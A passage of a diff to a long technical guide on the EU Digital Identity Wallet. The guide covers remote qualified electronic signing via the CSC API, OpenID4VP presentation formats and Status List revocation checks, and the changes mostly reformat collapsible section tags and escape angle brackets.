 Upon successful authorization (including user authentication if required by the QTSP), the Authorization Server returns a service access token. This token grants the Wallet permission to list credentials and query metadata, but **not** to sign — signing requires a separate Tier 2 credential-level authorization (step 11).
 
@@ -27690,7 +28486,8 @@ The service token is cached by the Wallet for the duration of the signing sessio
 
 
 </details>
-<details><summary><strong>10. EUDI Wallet requests credential list via POST /credentials/list</strong></summary>
+<details>
+<summary><strong>10. EUDI Wallet requests credential list via POST /credentials/list</strong></summary>
 
 Using the service access token obtained in step 8, the Wallet calls the CSC v2 `POST /credentials/list` endpoint to retrieve the User's available signing credentials at this QTSP:
 
@@ -27710,7 +28507,8 @@ The `userID` parameter identifies the user within the QTSP's credential manageme
 **Artifact Produced:** `POST /credentials/list` request with `userID` binding (Protocol layer).
 
 </details>
-<details><summary><strong>11. Remote QTSP returns available signing credentials</strong></summary>
+<details>
+<summary><strong>11. Remote QTSP returns available signing credentials</strong></summary>
 
 The RSSP responds with the list of credentials available to the authenticated user, including their status, algorithm support, and certificate information:
 
@@ -27743,7 +28541,8 @@ The `SCAL: "2"` confirms that this credential supports SCAL2 hash-bound authoriz
 
 
 </details>
-<details><summary><strong>12. EUDI Wallet prompts User to select signing credential from Remote QTSP list</strong></summary>
+<details>
+<summary><strong>12. EUDI Wallet prompts User to select signing credential from Remote QTSP list</strong></summary>
 
 The Wallet presents the available credentials to the User for selection. If multiple credentials exist, the User chooses which one to use for signing this document. If only one credential exists, the Wallet may auto-select it.
 
@@ -27752,7 +28551,8 @@ The selected `credentialID` will be used in subsequent CSC API calls to identify
 **Artifact Produced:** Selected `credentialID=credential-qes-001` binding in Wallet signing session (Device layer).
 
 </details>
-<details><summary><strong>13. User confirms signing credential selection in EUDI Wallet</strong></summary>
+<details>
+<summary><strong>13. User confirms signing credential selection in EUDI Wallet</strong></summary>
 
 The User reviews the credential details displayed by the Wallet — including the certificate subject name, issuer, validity period, and SCAL level — and explicitly confirms the selection. This confirmation is typically performed via biometric (fingerprint, face recognition) or device PIN, providing the first factor of the two-factor SCAL2 authentication.
 
@@ -27763,7 +28563,8 @@ This step establishes the User's intent to sign with this specific credential. T
 **Artifact Produced:** Local Wallet signing intent record binding `credentialID`, document hash, and timestamp (Device layer).
 
 </details>
-<details><summary><strong>14. EUDI Wallet prepares PDF for PAdES signing</strong></summary>
+<details>
+<summary><strong>14. EUDI Wallet prepares PDF for PAdES signing</strong></summary>
 
 The RQES SDK's `calculateDocumentHashes` function uses PodofoManager (a native C++ PDF library accessed via JNI on Android) to prepare the PDF for signing and compute the hash. This is not a simple file hash — it is a PAdES-specific hash:
 
@@ -27797,7 +28598,8 @@ stateDiagram-v2
 
 
 </details>
-<details><summary><strong>15. EUDI Wallet computes PAdES byte-range hash for Remote QTSP signing</strong></summary>
+<details>
+<summary><strong>15. EUDI Wallet computes PAdES byte-range hash for Remote QTSP signing</strong></summary>
 
 With the placeholder injected, PodofoManager computes the SHA-256 hash over the PDF's byte ranges:
 
@@ -27820,7 +28622,8 @@ The hash value is what will be sent to the RSSP for signing — the RSSP never s
 **Artifact Produced:** SHA-256 byte-range digest `kF2Qk8mBNqvXMTb3UvZ4WbYJ9R0cvKHdXsU7oP5wF1M=` over PAdES byte-range (Cryptographic layer).
 
 </details>
-<details><summary><strong>16. EUDI Wallet initiates credential-level OAuth2 authorization with hash binding (Tier 2, SCAL2)</strong></summary>
+<details>
+<summary><strong>16. EUDI Wallet initiates credential-level OAuth2 authorization with hash binding (Tier 2, SCAL2)</strong></summary>
 
 The Wallet initiates a second OAuth2 authorization, this time for the **specific credential** and bound to the **specific document hashes**. This is Tier 2 of the dual-layer model and the core SCAL2 security mechanism.
 
@@ -27856,7 +28659,8 @@ response_type=code
 **Artifact Produced:** SCAL2 RAR authorization request embedding document digest `kF2Qk8mBNqvXMTb3UvZ4WbYJ9R0cvKHdXsU7oP5wF1M=` bound to `credential-qes-001` (Protocol layer).
 
 </details>
-<details><summary><strong>17. User approves credential use in EUDI Wallet; Remote QTSP Authorization Server issues hash-bound credential access token</strong></summary>
+<details>
+<summary><strong>17. User approves credential use in EUDI Wallet; Remote QTSP Authorization Server issues hash-bound credential access token</strong></summary>
 
 The QTSP's authorization server presents the User with a consent screen showing the document(s) to be signed. The User approves with biometric/PIN. The resulting **credential access token** is cryptographically bound to these specific hashes — if the Wallet later tries to sign different documents, the RSSP will reject the `signHash` call.
 
@@ -27867,7 +28671,8 @@ The QTSP's authorization server presents the User with a consent screen showing 
 **Audit Telemetry:** `SCAL2_CREDENTIAL_TOKEN_ISSUED` logged by the QTSP's authorization server, binding the `credentialID` and document digest list.
 
 </details>
-<details><summary><strong>18. EUDI Wallet signs document hash via Remote QTSP POST /signatures/signHash</strong></summary>
+<details>
+<summary><strong>18. EUDI Wallet signs document hash via Remote QTSP POST /signatures/signHash</strong></summary>
 
 With the hash-bound credential access token, the Wallet calls `POST /signatures/signHash`. For SCAL2, the hashes do not need to be re-sent in the request body (they are already bound in the token):
 
@@ -27894,7 +28699,8 @@ The `signatures` array contains the raw PKCS#1 digital signature value created b
 
 
 </details>
-<details><summary><strong>19. EUDI Wallet assembles signed PAdES document from QTSP signature value</strong></summary>
+<details>
+<summary><strong>19. EUDI Wallet assembles signed PAdES document from QTSP signature value</strong></summary>
 
 The RQES SDK's `createSignedDocuments` function uses PodofoManager to embed the PKCS#1 signature value into the PAdES placeholder that was prepared in step 7:
 
@@ -27919,7 +28725,8 @@ The resulting document is a valid PAdES-signed PDF that can be verified by any P
 
 
 </details>
-<details><summary><strong>20. EUDI Wallet dispatches signed document to Relying Party Server</strong></summary>
+<details>
+<summary><strong>20. EUDI Wallet dispatches signed document to Relying Party Server</strong></summary>
 
 Using the Document Retrieval protocol's dispatch mechanism (§32.4.5), the Wallet sends the signed document back to the RP at the `response_uri` specified in the original request object:
 
@@ -27930,7 +28737,7 @@ Content-Type: application/json
 
 {
   "document_id": "contract-2026-07-001",
-  "documentWithSignature": "<base64-encoded-signed-PDF>",
+  "documentWithSignature": "&lt;base64-encoded-signed-PDF>",
   "signature_format": "PAdES",
   "conformance_level": "ADES_B_B",
   "signer_certificate_subject": "CN=Max Mustermann, C=DE"
@@ -27944,7 +28751,8 @@ Alternatively, if the RP specified `signatureObject` in the request, the Wallet 
 **Artifact Produced:** Signed PAdES document dispatched to Relying Party `response_uri` via `direct_post` (Network layer).
 
 </details>
-<details><summary><strong>21. Relying Party Server confirms QES signing completion to User</strong></summary>
+<details>
+<summary><strong>21. Relying Party Server confirms QES signing completion to User</strong></summary>
 
 Upon receiving the signed document, the RP performs final validation and notifies the user of successful completion:
 
@@ -28054,13 +28862,15 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. User selects document for signing at Relying Party Server</strong></summary>
+<details>
+<summary><strong>1. User selects document for signing at Relying Party Server</strong></summary>
 
 The User uploads or selects a document for signing on the RP's platform. Unlike Scenarios A and B, the document stays on the RP's server throughout the entire flow — it is never transmitted to the Wallet or the QTSP (only the document hash is sent). This is the key architectural difference: the RP retains full control of the document lifecycle.
 
 
 </details>
-<details><summary><strong>2. Relying Party Server selects QTSP for signing</strong></summary>
+<details>
+<summary><strong>2. Relying Party Server selects QTSP for signing</strong></summary>
 
 The RP chooses which QTSP to use for signing. Per QES_04 note: "In a Relying Party-centric flow, the remote QTSP will likely be selected by the Relying Party, which implies the QSCD is managed by the remote QTSP."
 
@@ -28068,7 +28878,8 @@ The RP may pre-configure a single QTSP (most common for enterprise integrations)
 
 
 </details>
-<details><summary><strong>3. Relying Party Server discovers RSSP capabilities via GET /csc/v2/info</strong></summary>
+<details>
+<summary><strong>3. Relying Party Server discovers RSSP capabilities via GET /csc/v2/info</strong></summary>
 
 The RP calls `GET /csc/v2/info` on the QTSP's base URI to discover its capabilities. Unlike Scenario B where the Wallet makes this call, here the RP's server-side CSC client initiates the discovery:
 
@@ -28081,7 +28892,8 @@ The response includes the OAuth2 authorization server URL, supported signature a
 
 
 </details>
-<details><summary><strong>4. Remote QTSP returns metadata to Relying Party Server</strong></summary>
+<details>
+<summary><strong>4. Remote QTSP returns metadata to Relying Party Server</strong></summary>
 
 The QTSP's RSSP responds with its service metadata, including the OAuth2 authorization server URL, supported signature algorithms, and available CSC methods:
 
@@ -28107,7 +28919,8 @@ This metadata enables the RP to construct subsequent OAuth2 authorization reques
 
 
 </details>
-<details><summary><strong>5. Relying Party Server requests service access token via Client Credentials</strong></summary>
+<details>
+<summary><strong>5. Relying Party Server requests service access token via Client Credentials</strong></summary>
 
 The RP uses the **Client Credentials** OAuth2 flow for server-to-server service authorization. This is the key difference from Scenario B — the RP authenticates as a **confidential client** with pre-registered credentials, not via interactive browser-based OAuth.
 
@@ -28134,7 +28947,8 @@ The `grant_type=client_credentials` indicates that no user interaction is needed
 
 
 </details>
-<details><summary><strong>6. Remote QTSP returns service access token to Relying Party Server</strong></summary>
+<details>
+<summary><strong>6. Remote QTSP returns service access token to Relying Party Server</strong></summary>
 
 The QTSP's authorization server responds with a service access token:
 
@@ -28151,7 +28965,8 @@ This service access token is valid for credential listing and metadata operation
 
 
 </details>
-<details><summary><strong>7. Relying Party Server requests credential list from Remote QTSP</strong></summary>
+<details>
+<summary><strong>7. Relying Party Server requests credential list from Remote QTSP</strong></summary>
 
 Using the service access token, the RP calls `POST /credentials/list` to retrieve the User's available signing credentials from the QTSP:
 
@@ -28170,7 +28985,8 @@ The QTSP responds with a list of credential IDs associated with the User, along 
 
 
 </details>
-<details><summary><strong>8. Remote QTSP returns credential IDs to Relying Party Server</strong></summary>
+<details>
+<summary><strong>8. Remote QTSP returns credential IDs to Relying Party Server</strong></summary>
 
 The QTSP responds with the list of available signing credentials for the User:
 
@@ -28184,7 +29000,8 @@ Each credential ID represents a different QES certificate the User has registere
 
 
 </details>
-<details><summary><strong>9. Relying Party Server computes document hash for signing</strong></summary>
+<details>
+<summary><strong>9. Relying Party Server computes document hash for signing</strong></summary>
 
 The RP prepares the PDF for PAdES signing by adding the signature placeholder and computing the SHA-256 hash over the document byte ranges. Since the RP is a server, it uses standard cryptographic libraries (e.g., BouncyCastle, OpenSSL) rather than a mobile PDF library:
 
@@ -28209,7 +29026,8 @@ This document hash will be bound to the credential authorization in later steps,
 
 
 </details>
-<details><summary><strong>10. Relying Party Server requests User authorization via EUDI Wallet (OpenID4VP with transaction_data)</strong></summary>
+<details>
+<summary><strong>10. Relying Party Server requests User authorization via EUDI Wallet (OpenID4VP with transaction_data)</strong></summary>
 
 The RP sends an OpenID4VP authorization request to the User's Wallet, including the document hash in the `transaction_data` extension (§15.15.5). This serves two purposes: (a) WYSIWYS — the Wallet displays the signing context to the User, and (b) proof of authorization — the signed KB-JWT response is cryptographic evidence that the User consented to sign this specific document.
 
@@ -28255,7 +29073,8 @@ The Wallet displays the `label` and `qtsp_name` to the User: *"Sign 'Service Agr
 
 
 </details>
-<details><summary><strong>11. EUDI Wallet displays signing request to User (WYSIWYS)</strong></summary>
+<details>
+<summary><strong>11. EUDI Wallet displays signing request to User (WYSIWYS)</strong></summary>
 
 Upon receiving the OpenID4VP request with `transaction_data`, the Wallet parses the document digest information and presents a **What You See Is What You Sign (WYSIWYS)** interface to the User. The display includes:
 
@@ -28285,7 +29104,8 @@ The Wallet ensures the displayed information matches the cryptographic hashes in
 
 
 </details>
-<details><summary><strong>12. User approves signing with biometric/PIN authentication</strong></summary>
+<details>
+<summary><strong>12. User approves signing with biometric/PIN authentication</strong></summary>
 
 The User reviews the WYSIWYS display and decides whether to authorize the signing operation. If they approve, the Wallet prompts for local authentication:
 
@@ -28327,7 +29147,8 @@ The KB-JWT is signed with the Wallet's binding key (`cnf.jwk`), which the RP can
 
 
 </details>
-<details><summary><strong>13. EUDI Wallet returns authorization response to Relying Party Server</strong></summary>
+<details>
+<summary><strong>13. EUDI Wallet returns authorization response to Relying Party Server</strong></summary>
 
 The Wallet sends the signed authorization response to the RP via the `response_uri` specified in the OpenID4VP request. The response is a JWT containing the VP token with the KB-JWT:
 
@@ -28353,7 +29174,8 @@ This authorization response serves as the **User's cryptographic consent** for t
 
 
 </details>
-<details><summary><strong>14. Relying Party Server requests credential authorization from Remote QTSP (SCAL2 hash-bound)</strong></summary>
+<details>
+<summary><strong>14. Relying Party Server requests credential authorization from Remote QTSP (SCAL2 hash-bound)</strong></summary>
 
 Using the Wallet's authorization proof (the KB-JWT from step 8), the RP requests credential-level authorization from the QTSP. The document hashes are bound to the authorization request via RAR (Rich Authorization Requests):
 
@@ -28385,7 +29207,8 @@ This is the second tier of CSC's dual-layer OAuth2 model — **credential author
 
 
 </details>
-<details><summary><strong>15. Remote QTSP issues hash-bound credential access token to Relying Party Server</strong></summary>
+<details>
+<summary><strong>15. Remote QTSP issues hash-bound credential access token to Relying Party Server</strong></summary>
 
 The QTSP validates the authorization request and issues a credential access token bound to the specified document hashes:
 
@@ -28408,7 +29231,8 @@ The resulting credential access token has a short expiry (typically 300 seconds)
 
 
 </details>
-<details><summary><strong>16. Relying Party Server sends signHash request to Remote QTSP</strong></summary>
+<details>
+<summary><strong>16. Relying Party Server sends signHash request to Remote QTSP</strong></summary>
 
 The RP calls `POST /signatures/signHash` with the credential access token to obtain the digital signature from the QTSP's remote QSCD:
 
@@ -28429,7 +29253,8 @@ The `operationMode: "S"` indicates synchronous signing — the QTSP will return 
 
 
 </details>
-<details><summary><strong>17. Remote QTSP returns digital signature value to Relying Party Server</strong></summary>
+<details>
+<summary><strong>17. Remote QTSP returns digital signature value to Relying Party Server</strong></summary>
 
 The RSSP routes the request to the remote QSCD and returns the raw ECDSA signature value:
 
@@ -28445,7 +29270,8 @@ The signature is a Base64-encoded ASN.1 DER structure containing the ECDSA `(r, 
 
 
 </details>
-<details><summary><strong>18. Relying Party Server assembles PAdES document server-side</strong></summary>
+<details>
+<summary><strong>18. Relying Party Server assembles PAdES document server-side</strong></summary>
 
 The RP embeds the signature value into the prepared PDF, creating a PAdES-B-LT (Long-Term) document. Unlike Scenario B (where the Wallet uses PodofoManager), the RP uses server-side PDF libraries:
 
@@ -28472,7 +29298,8 @@ The assembly process wraps the raw signature in a CMS Advanced Electronic Signat
 
 
 </details>
-<details><summary><strong>19. Relying Party Server delivers signed document to User</strong></summary>
+<details>
+<summary><strong>19. Relying Party Server delivers signed document to User</strong></summary>
 
 The signed PAdES document is stored on the RP's infrastructure and made available to the User for download. The RP typically:
 
@@ -28611,14 +29438,14 @@ In the EUDI reference implementation, SCAL2 is enforced at the type level — th
 suspend fun CredentialAuthorized.SCAL2.signHash(
     signingAlgorithmOID: SigningAlgorithmOID,
     signingAlgorithmParams: String? = null,
-): Result<SignaturesList>
+): Result&lt;SignaturesList>
 
 // SCAL1 signHash — caller must specify hashes (no binding guarantee)
 suspend fun CredentialAuthorized.SCAL1.signHash(
     documentDigestList: DocumentDigestList,
     signingAlgorithmOID: SigningAlgorithmOID,
     signingAlgorithmParams: String? = null,
-): Result<SignaturesList>
+): Result&lt;SignaturesList>
 ```
 
 ##### 33.1.5 Reference Implementation
@@ -28727,7 +29554,8 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. Relying Party Server presents QR code or deep link to User</strong></summary>
+<details>
+<summary><strong>1. Relying Party Server presents QR code or deep link to User</strong></summary>
 
 The RP generates a QR code (for cross-device flow) or a deep link (for same-device flow) containing a `request_uri` that points to a JAR-signed request object. The URI follows the `mdoc-openid4vp` scheme defined in the EUDI reference implementation:
 
@@ -28743,14 +29571,16 @@ The RP must pre-compute the document hash and embed it in the request object *be
 
 
 </details>
-<details><summary><strong>2. User scans QR code into EUDI Wallet</strong></summary>
+<details>
+<summary><strong>2. User scans QR code into EUDI Wallet</strong></summary>
 
 The User opens their EUDI Wallet and scans the QR code (cross-device) or taps the deep link (same-device). The Wallet recognises the `mdoc-openid4vp` scheme and extracts the `request_uri` and `client_id` parameters. At this point, no document content has been transferred — the Wallet only has a pointer to the RP's request object.
 
 **Artifact Produced:** Extracted `request_uri` + `client_id` tuple in Wallet memory (User layer).
 
 </details>
-<details><summary><strong>3. EUDI Wallet fetches JAR-signed request object from Relying Party Server</strong></summary>
+<details>
+<summary><strong>3. EUDI Wallet fetches JAR-signed request object from Relying Party Server</strong></summary>
 
 The Wallet performs an HTTP GET on the `request_uri` to fetch the request object. The RP returns a JAR-signed JWT (RFC 9101) containing the full request parameters:
 
@@ -28765,7 +29595,8 @@ The RP responds with the signed request object. The Wallet validates the JAR sig
 **Artifact Produced:** Raw JAR-signed JWT fetched from `request_uri` (Network layer).
 
 </details>
-<details><summary><strong>4. Relying Party Server returns request object with document locations and hashes</strong></summary>
+<details>
+<summary><strong>4. Relying Party Server returns request object with document locations and hashes</strong></summary>
 
 The request object contains document metadata — locations, hashes, access methods, and labels:
 
@@ -28796,7 +29627,8 @@ The `hash` field is critical — it binds the request to a specific document ver
 
 
 </details>
-<details><summary><strong>5. EUDI Wallet parses and validates request object from Relying Party Server</strong></summary>
+<details>
+<summary><strong>5. EUDI Wallet parses and validates request object from Relying Party Server</strong></summary>
 
 The Wallet performs structural and cryptographic validation of the request object:
 
@@ -28813,7 +29645,8 @@ If any validation step fails, the Wallet rejects the request and displays an err
 **Artifact Produced:** Validated request object binding the RP identity, document hashes, and `response_uri` (Cryptographic layer).
 
 </details>
-<details><summary><strong>6. EUDI Wallet downloads documents from Relying Party Server</strong></summary>
+<details>
+<summary><strong>6. EUDI Wallet downloads documents from Relying Party Server</strong></summary>
 
 The Wallet downloads each document from its `uri` using the specified `access_method`. For the common `Public` method, this is a simple HTTP GET:
 
@@ -28828,7 +29661,8 @@ For `OAuth2` access, the Wallet uses a bearer token provided in the request obje
 **Artifact Produced:** Raw document bytes stored in Wallet secure local storage (Device layer).
 
 </details>
-<details><summary><strong>7. EUDI Wallet computes document hashes and verifies integrity against Relying Party Server JAR</strong></summary>
+<details>
+<summary><strong>7. EUDI Wallet computes document hashes and verifies integrity against Relying Party Server JAR</strong></summary>
 
 After download, the Wallet computes the cryptographic hash of each document and compares it to the `hash` value from the request object. This is the primary defence against document substitution attacks:
 
@@ -28851,14 +29685,16 @@ If any hash mismatch is detected, the Wallet immediately aborts the flow and ale
 **Artifact Produced:** Hash-verified document binding proof (Cryptographic layer).
 
 </details>
-<details><summary><strong>8. EUDI Wallet performs full CSC API signing flow against Remote QTSP</strong></summary>
+<details>
+<summary><strong>8. EUDI Wallet performs full CSC API signing flow against Remote QTSP</strong></summary>
 
 The Wallet executes the full CSC API v2.0 signing protocol as detailed in §32.1 — service-level OAuth2 authorization, credential listing, document hash computation (PAdES-specific), credential-level SCAL2 authorization with hash binding, `signHash` invocation, and signed document assembly. For the complete step-by-step breakdown of this phase, see the Scenario B walkthrough (§32.2.2, steps 4–10).
 
 **Artifact Produced:** PKCS#1 signature value returned from Remote QTSP QSCD (Protocol layer).
 
 </details>
-<details><summary><strong>9. EUDI Wallet dispatches signed documents to Relying Party Server</strong></summary>
+<details>
+<summary><strong>9. EUDI Wallet dispatches signed documents to Relying Party Server</strong></summary>
 
 After signing, the Wallet sends the results back to the RP at the `response_uri` specified in the request object using `direct_post`:
 
@@ -28869,7 +29705,7 @@ Content-Type: application/json
 
 {
   "document_id": "contract-2026-07-001",
-  "documentWithSignature": "<base64-encoded-signed-PDF>",
+  "documentWithSignature": "&lt;base64-encoded-signed-PDF>",
   "signature_format": "PAdES",
   "conformance_level": "ADES_B_B"
 }
@@ -28880,7 +29716,8 @@ The RP can request either `documentWithSignature` (complete signed PDF — the W
 **Artifact Produced:** Signed PAdES document dispatched to Relying Party `response_uri` (Network layer).
 
 </details>
-<details><summary><strong>10. Relying Party Server acknowledges receipt and validates PAdES signature</strong></summary>
+<details>
+<summary><strong>10. Relying Party Server acknowledges receipt and validates PAdES signature</strong></summary>
 
 The RP validates the received signed document (PAdES signature verification per ETSI EN 319 102-1), stores it, and sends an acknowledgement response to the Wallet:
 
@@ -29521,7 +30358,7 @@ The appendices provide low-level protocol artifacts and specialised verification
 When the Wallet Unit responds to an OpenID4VP request with an SD-JWT VC credential, the presentation is delivered as a JWE-encrypted `direct_post.jwt`. The decrypted inner structure contains the `vp_token`:
 
 ```
-<Issuer-signed JWT>~<Disclosure1>~<Disclosure2>~...~<DisclosureN>~<Key Binding JWT>
+&lt;Issuer-signed JWT>~&lt;Disclosure1>~&lt;Disclosure2>~...~&lt;DisclosureN>~&lt;Key Binding JWT>
 ```
 
 **Full decoded example** (PID presentation with selective disclosure of `family_name`, `given_name`, `birth_date`):
@@ -29532,7 +30369,7 @@ When the Wallet Unit responds to an OpenID4VP request with an SD-JWT VC credenti
   "typ": "vc+sd-jwt",
   "alg": "ES256",
   "kid": "pid-issuer-key-2026",
-  "x5c": ["<PID Provider signing certificate>", "<Intermediate CA>"]
+  "x5c": ["&lt;PID Provider signing certificate>", "&lt;Intermediate CA>"]
 }
 
 // === Issuer-Signed JWT Payload ===
@@ -29601,28 +30438,28 @@ The `vp_token` is encrypted to the RP using the ephemeral public key from the Au
 {
   "alg": "ECDH-ES",
   "enc": "A256GCM",
-  "kid": "<RP ephemeral key thumbprint>",
+  "kid": "&lt;RP ephemeral key thumbprint>",
   "epk": {
     "kty": "EC",
     "crv": "P-256",
-    "x": "<Wallet ephemeral X>",
-    "y": "<Wallet ephemeral Y>"
+    "x": "&lt;Wallet ephemeral X>",
+    "y": "&lt;Wallet ephemeral Y>"
   },
-  "apu": "<base64url(Wallet ephemeral key)>",
-  "apv": "<base64url(RP nonce)>"
+  "apu": "&lt;base64url(Wallet ephemeral key)>",
+  "apv": "&lt;base64url(RP nonce)>"
 }
 
 // === Decrypted JWE Payload (DCQL-native format — HAIP 1.0) ===
 {
   "vp_token": {
-    "pid": "<SD-JWT VC string as shown above>"
+    "pid": "&lt;SD-JWT VC string as shown above>"
   },
   "state": "af0ifjsldkj"
 }
 
 // === Alternative: Legacy presentation_submission format ===
 // {
-//   "vp_token": "<SD-JWT VC string>",
+//   "vp_token": "&lt;SD-JWT VC string>",
 //   "presentation_submission": {
 //     "id": "submission-1",
 //     "definition_id": "dcql-query-1",
@@ -29671,8 +30508,8 @@ DeviceResponse = {
         "issuerAuth": [         ; COSE_Sign1
           h'a10126',             ; protected: {1: -7} (ES256)
           {},                    ; unprotected
-          h'<MSO CBOR bytes>',  ; payload: MobileSecurityObject
-          h'<signature bytes>'   ; signature
+          h'&lt;MSO CBOR bytes>',  ; payload: MobileSecurityObject
+          h'&lt;signature bytes>'   ; signature
         ]
       },
       "deviceSigned": {
@@ -29682,7 +30519,7 @@ DeviceResponse = {
             h'a10126',           ; protected: ES256
             {},                  ; unprotected
             nil,                 ; detached payload (SessionTranscript)
-            h'<device sig>'      ; signature over SessionTranscript
+            h'&lt;device sig>'      ; signature over SessionTranscript
           ]
         }
       }
@@ -29775,7 +30612,7 @@ A Status List Token is a JWT containing a compressed bitstring:
   "exp": 1741355493,
   "status_list": {
     "bits": 1,
-    "lst": "<base64url-encoded DEFLATE-compressed bitstring>"
+    "lst": "&lt;base64url-encoded DEFLATE-compressed bitstring>"
   }
 }
 ```
@@ -29851,7 +30688,8 @@ sequenceDiagram
 
 #### B.3.1 Status List Verification Payload Walkthrough
 
-<details><summary><strong>1. Relying Party Server extracts status reference (uri + idx) from credential</strong></summary>
+<details>
+<summary><strong>1. Relying Party Server extracts status reference (uri + idx) from credential</strong></summary>
 
 Within the SD-JWT VC Issuer-signed JWT payload, the PID Provider includes a `status` claim referencing the Status List endpoint and the credential's index:
 
@@ -29884,14 +30722,16 @@ The RP extracts:
 **Artifact Produced:** Revocation reference tuple `{uri, idx}` extracted from credential `status` claim (Application layer).
 
 </details>
-<details><summary><strong>2. Relying Party Server checks local cache for Status List Token</strong></summary>
+<details>
+<summary><strong>2. Relying Party Server checks local cache for Status List Token</strong></summary>
 
 The RP queries its internal cache (Redis, in-memory LRU, or database) for a previously fetched Status List Token matching the `uri` (`https://pid-provider.example-ms.eu/status/lists/chunk-47`). The cache key is the full URI. This caching step is critical for performance — a high-traffic RP may verify thousands of credentials per hour, and each shares the same chunked Status List. Without caching, the RP would issue redundant HTTP requests to the PID Provider for every verification, adding latency and load.
 
 **Artifact Produced:** Cache lookup key `https://pid-provider.example-ms.eu/status/lists/chunk-47` (Application layer).
 
 </details>
-<details><summary><strong>3. Relying Party Cache returns cached Status List Token to Relying Party Server</strong></summary>
+<details>
+<summary><strong>3. Relying Party Cache returns cached Status List Token to Relying Party Server</strong></summary>
 
 If the cache contains a token for this URI and its `exp` claim is still in the future, the RP uses it directly — skipping the HTTP fetch (steps 4–5) and JWT verification (step 6). The RP jumps straight to decompression (step 9). The `exp`-based TTL is typically 1–24 hours, set by the PID Provider to balance freshness against load. A shorter TTL means faster revocation propagation but more HTTP traffic; a longer TTL reduces load but delays revocation detection.
 
@@ -29902,7 +30742,8 @@ If the cache contains a token for this URI and its `exp` claim is still in the f
 **Artifact Produced:** Cached Status List Token JWT (cache hit path) — skips steps 4–8 (Application layer).
 
 </details>
-<details><summary><strong>4. Relying Party Server fetches Status List Token from Status List Endpoint</strong></summary>
+<details>
+<summary><strong>4. Relying Party Server fetches Status List Token from Status List Endpoint</strong></summary>
 
 If the RP's local cache does not contain a valid (non-expired) Status List Token for this URI:
 
@@ -29915,7 +30756,8 @@ Accept: application/statuslist+jwt
 **Artifact Produced:** HTTP GET request to Status List Endpoint (Network layer).
 
 </details>
-<details><summary><strong>5. Status List Endpoint returns Status List Token (JWT)</strong></summary>
+<details>
+<summary><strong>5. Status List Endpoint returns Status List Token (JWT)</strong></summary>
 
 Response:
 
@@ -29930,7 +30772,8 @@ eyJhbGciOiJFUzI1NiIsInR5cCI6InN0YXR1c2xpc3Qrand0Iiwia2lkIjoicGlkLXByb3ZpZGVyLXN0
 **Artifact Produced:** Raw Status List Token JWT from PID Provider endpoint (Network layer).
 
 </details>
-<details><summary><strong>6. Relying Party Server verifies Status List JWT signature against issuer signing key from LoTE</strong></summary>
+<details>
+<summary><strong>6. Relying Party Server verifies Status List JWT signature against issuer signing key from LoTE</strong></summary>
 
 The RP verifies the signature against the PID Provider's signing key (same trust chain used to verify the credential itself).
 
@@ -29966,28 +30809,32 @@ RP verification checks:
 **Artifact Produced:** Decoded and signature-verified Status List JWT bound to PID Provider LoTE signing key (Cryptographic layer).
 
 </details>
-<details><summary><strong>7. Relying Party Server checks exp claim for Status List Token freshness</strong></summary>
+<details>
+<summary><strong>7. Relying Party Server checks exp claim for Status List Token freshness</strong></summary>
 
 The RP confirms that the Status List Token's `exp` claim is in the future (`exp` > current Unix timestamp). If expired, the token is considered stale and the RP must re-fetch from the endpoint (step 4). The `iat` claim indicates when the PID Provider last regenerated the Status List — a large gap between `iat` and the current time (e.g., > 24 hours) may indicate the RP should consider a forced refresh even if `exp` hasn't been reached, depending on the RP's risk appetite.
 
 **Artifact Produced:** Freshness-confirmed Status List Token (exp: `1741355493`, valid until ~24h after issuance) (Application layer).
 
 </details>
-<details><summary><strong>8. Relying Party Server stores validated Status List Token in local cache</strong></summary>
+<details>
+<summary><strong>8. Relying Party Server stores validated Status List Token in local cache</strong></summary>
 
 The RP stores the validated Status List Token in its local cache, keyed by the `uri`. The cache TTL is derived from the token's `exp` claim (or the HTTP `Cache-Control: max-age` header, whichever is shorter). The RP may also store the decompressed bitstring alongside the JWT to avoid repeated DEFLATE decompression for subsequent verifications against the same chunk.
 
 **Artifact Produced:** Cached Status List Token entry keyed by `uri` with TTL derived from `exp` claim (Application layer).
 
 </details>
-<details><summary><strong>9. Relying Party Server decompresses Status List bitstring via DEFLATE</strong></summary>
+<details>
+<summary><strong>9. Relying Party Server decompresses Status List bitstring via DEFLATE</strong></summary>
 
 The RP base64url-decodes the `lst` value from the Status List Token's `status_list` claim, then applies raw DEFLATE decompression (RFC 1951, no zlib/gzip wrapper). The result is a byte array where each credential's status occupies `bits` consecutive bits (typically `bits=1`: 1 bit per credential). For a chunk of 10,000 entries with `bits=1`, the decompressed bitstring is ~1,250 bytes. The compressed form is typically only a few hundred bytes — most credentials are valid (bit=0), so the bitstring compresses extremely well.
 
 **Artifact Produced:** Decompressed bitstring byte array (`~1,250 bytes` for 10,000 entries at `bits=1`) (Application layer).
 
 </details>
-<details><summary><strong>10. Relying Party Server extracts credential status bit at index {idx} from decompressed bitstring</strong></summary>
+<details>
+<summary><strong>10. Relying Party Server extracts credential status bit at index {idx} from decompressed bitstring</strong></summary>
 
 The RP locates the precise bit mapped to the credential's `idx` (e.g., bit 8472).
 
@@ -30009,7 +30856,7 @@ bits_per_status = status_list_token["status_list"]["bits"]  # 1
 byte_index = (idx * bits_per_status) // 8
 bit_index = (idx * bits_per_status) % 8
 status_byte = decompressed[byte_index]
-status_value = (status_byte >> bit_index) & ((1 << bits_per_status) - 1)
+status_value = (status_byte >> bit_index) & ((1 &lt;< bits_per_status) - 1)
 
 # 4. Interpret the status
 if status_value == 0:
@@ -30023,14 +30870,16 @@ elif status_value == 1:
 **Artifact Produced:** `status_value = 0` (VALID) or `status_value = 1` (REVOKED) integer at `idx=8472` (Application layer).
 
 </details>
-<details><summary><strong>11. Relying Party Server confirms credential VALID and proceeds with verification pipeline</strong></summary>
+<details>
+<summary><strong>11. Relying Party Server confirms credential VALID and proceeds with verification pipeline</strong></summary>
 
 If the extracted status value is `0`, the credential is not revoked or suspended — the RP can proceed with the presentation. This status check is the final step in the verification pipeline (§11): issuer signature → disclosure integrity → holder binding (KB-JWT) → revocation status. All four must pass for the presentation to be accepted. The RP should log the verification result (timestamp, credential index, status = VALID) for audit purposes.
 
 **Artifact Produced:** `CREDENTIAL_STATUS_VALID` verification result at `idx=8472` added to audit trail (Application layer).
 
 </details>
-<details><summary><strong>12. Relying Party Server rejects presentation — credential status REVOKED by PID Provider (bit = 1)</strong></summary>
+<details>
